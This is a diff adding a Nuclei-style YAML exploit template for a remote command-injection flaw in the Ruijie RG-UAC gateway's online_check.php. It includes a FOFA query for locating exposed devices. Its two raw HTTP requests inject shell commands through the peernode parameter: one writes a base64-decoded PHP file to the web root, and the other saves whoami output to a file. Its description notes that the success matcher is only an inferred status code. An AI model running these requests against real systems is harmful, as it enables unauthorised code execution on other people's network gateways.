@@ -1,0 +1,84 @@
+id: poc-c8d239cbac554b70bd8c
+info:
+  name: 锐捷RG-UAC应用网关online_check.php前台RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c8d239cbac554b70bd8cd16bb6e468dc
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: c8d239cbac554b70bd8cd16bb6e468dc
+    fofa: fofa：app="Ruijie-RG-UAC"
+http:
+- raw:
+  - 'GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==%20|%20base64%20-d%20%3E%20test.php` HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-User: ?1
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`whoami%20>%201.txt` HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Dest: document
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-User: ?1
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
